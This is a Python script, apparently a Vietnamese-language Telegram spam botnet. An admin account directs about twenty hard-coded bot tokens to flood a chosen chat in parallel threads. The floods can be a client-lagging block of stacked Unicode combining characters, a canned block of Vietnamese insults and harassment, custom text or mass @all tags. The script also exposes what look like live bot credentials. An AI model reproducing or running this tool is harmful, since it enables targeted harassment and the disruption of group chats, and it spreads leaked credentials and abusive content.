import telebot
import threading
from flask import Flask
import time
import requests

# --- DANH SÁCH TOKEN CỦA ÔNG ---
RAW_TOKENS = [
    '8429960682:AAHltNvwWjEn1QC_f5R8JPgz7uN1uFhny18', '8481938728:AAGen1t8Tz3jeu02kJ8HoCIZLiPLdd687n8',
    '8739448460:AAGNLEW-WDvatbxmPLzkziG5jpd5hTRfqiE', '8689807630:AAEoXvm45QaW1jlT-H_KzNlmCpu50Q3k2S4',
    '8575475228:AAHRtsOcCEQInRvR3isSBV-Igur-WykB_PE', '8651553692:AAGNQwqUoWgV1QV0ozaZHLRL0RJm9M8q0e0',
    '8712129360:AAEgW2hBbtsgY8DyMd9mxYw1B6X8_VBpF-g', '8716604939:AAH2isXOrU_J8gyRlrsqnfem6Y4F3eUwg_0',
    '8734778356:AAF1ZZbigLFn4TDKnFPJ7KIhSRNT2b8UFnc', '8750340566:AAG_fJhmqgs1X67kJybsG3i1uBYCNELqV9c',
    '8612349553:AAFGMoIgICvQH5DK3BuFQnT9AkR8i__4kIo', '8697555066:AAEmP-XxiwDynhMgNWPsANr1hksg5mhHLhM',
    '8626439785:AAEn2pArlYu0KW9tHLETtrJUXKo2BR0hjx0', '8793582382:AAHfbcee8kt-x6OeLHqwqXP79U4PBaII0MA',
    '8397463503:AAGajcEI5H_SJ0i6mccvPT7GC-P8U5RTLOQ', '8718672219:AAH37zxnCBuWLMSEW_rCvEwnrf0ym8d7-H0',
    '8650032681:AAE9TeiIlywG796f6y6hKLN7JiBWhNgH3gc', '8303481123:AAFN_bijtWzXlR1FlYHEvgN-5uhyqnZsbu0',
    '8619086108:AAFYqRAdKNvg84eyj1ylXfa-TF8W8o8fxbo', '8661308767:AAFU__yZv8r1HlJ5jaW3URW88bWKWYKDCCY',
    '8625550674:AAHIHuakDCvvxwCC0mgrDLU5g8vBNFdD7eI', '8724848112:AAHhLYnH1LO4tVUPMTjztbNZZtni7D0uDl4',
    '8471422557:AAF30BcMF15veQPHCTDqcA1NU0iHb63Zm1o'
]

VALID_TOKENS = []
BOT_USERNAMES = []
ADMIN_LIST = [7153197678]
is_spaming = False
spam_delay = 0.5 
app = Flask('')

@app.route('/')
def home(): return f"BOTS LIVE: {len(VALID_TOKENS)}"

# --- VĂN BẢN LAG SIÊU DÀI ---
LAG_TEXT = """
꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
జ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞాజ్ఞా
็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็
꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰
"""

# --- VĂN BẢN ĐÀI ---
WAR_TEXT = """
cn choa ei=))=))=))=))=))
m chay dau cho thoat khoi tay t=))=))
sua len di con dix mồ côi=))=))
slow vcl e ơi mồ côi gáy gắt lên=))=))
cay di e cay di e cmm tk nfu=))=))
cmm nfu nfu nfu mồ côi sủa gắt=))=))
choa sua tiep di bố m đang đợi m đây=))=))
thanh nien mồ côi sủa đê gáy gắt lên e=))=))
bố m đang vả vỡ mõm m đây con dog=))=))
cay vcl kkk bất lực rồi đúng k e=))=))
tk ga vcl nhìn bầy bot vả m nè=))=))
"""

def launch_attack(chat_id, mode, custom_text=None):
    global is_spaming
    def attack_task(tk):
        worker = telebot.TeleBot(tk)
        while is_spaming:
            try:
                if mode == 'lag': worker.send_message(chat_id, LAG_TEXT)
                elif mode == 'dai': worker.send_message(chat_id, WAR_TEXT)
                elif mode == 'text': worker.send_message(chat_id, custom_text)
                elif mode == 'tag': worker.send_message(chat_id, f"GỌI HỒN THẰNG CÔ NÔ @all")
                time.sleep(spam_delay)
            except: break
    for t in VALID_TOKENS:
        threading.Thread(target=attack_task, args=(t,), daemon=True).start()

def bot_engine(token, is_master):
    try:
        bot = telebot.TeleBot(token)
        if is_master:
            @bot.message_handler(func=lambda m: m.from_user.id in ADMIN_LIST)
            def admin_handler(m):
                global is_spaming, spam_delay, ADMIN_LIST
                txt = m.text.lower()
                
                if txt == '/help':
                    bot.reply_to(m, "👑 [MASTER] ĐANG ĐIỀU KHIỂN\n/splag | /spdai | /spam [t] | /sptag\n/list | /info | /dung\n/setdelay [s] | /addadm [id] | /xoaadm [id]")
                elif txt == '/splag':
                    is_spaming = True
                    bot.reply_to(m, "🌪️ BẮT ĐẦU GÂY LAG!")
                    launch_attack(m.chat.id, 'lag')
                elif txt == '/spdai':
                    is_spaming = True
                    bot.reply_to(m, "🔥 TỔNG LỰC CHIẾN ĐÀI!")
                    launch_attack(m.chat.id, 'dai')
                elif txt.startswith('/spam '):
                    is_spaming = True
                    launch_attack(m.chat.id, 'text', m.text[6:])
                elif txt == '/sptag':
                    is_spaming = True
                    launch_attack(m.chat.id, 'tag')
                elif txt == '/dung':
                    is_spaming = False
                    bot.reply_to(m, "🛑 DỪNG TOÀN BỘ.")
                elif txt == '/list':
                    bot.reply_to(m, "🤖 DANH SÁCH BOT SỐNG:\n" + "\n".join(BOT_USERNAMES))
                elif txt == '/info':
                    bot.reply_to(m, f"📊 HT: {len(VALID_TOKENS)} Bot | Delay: {spam_delay}s")
                elif txt.startswith('/setdelay '):
                    try:
                        spam_delay = float(m.text.split(' ')[1])
                        bot.reply_to(m, f"✅ Đã chỉnh delay: {spam_delay}s")
                    except: pass
                elif txt.startswith('/addadm '):
                    try:
                        nid = int(m.text.split(' ')[1])
                        if nid not in ADMIN_LIST: ADMIN_LIST.append(nid)
                        bot.reply_to(m, f"✅ Thêm Admin: {nid}")
                    except: pass
                elif txt.startswith('/xoaadm '):
                    try:
                        rid = int(m.text.split(' ')[1])
                        if rid in ADMIN_LIST: ADMIN_LIST.remove(rid)
                        bot.reply_to(m, f"❌ Xóa Admin: {rid}")
                    except: pass

        bot.infinity_polling(timeout=20, skip_pending=True)
    except: pass

def check_and_start():
    global VALID_TOKENS, BOT_USERNAMES
    print("--- ĐANG QUÉT TOKEN ---")
    for t in RAW_TOKENS:
        try:
            # Gửi request kiểm tra token trực tiếp
            r = requests.get(f"https://api.telegram.org/bot{t}/getMe", timeout=5).json()
            if r.get("ok"):
                is_master = (len(VALID_TOKENS) == 0)
                VALID_TOKENS.append(t)
                u_name = r['result']['username']
                BOT_USERNAMES.append(f"@{u_name}")
                threading.Thread(target=bot_engine, args=(t, is_master), daemon=True).start()
                print(f"[LIVE] {u_name} {'(ADMIN)' if is_master else ''}")
            else:
                print(f"[DEAD] Token không hợp lệ hoặc bị xóa.")
        except:
            print(f"[ERROR] Không thể kết nối với token.")
    
    print(f"--- HOÀN TẤT: {len(VALID_TOKENS)} BOT HOẠT ĐỘNG ---")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    check_and_start()
    while True: time.sleep(3)
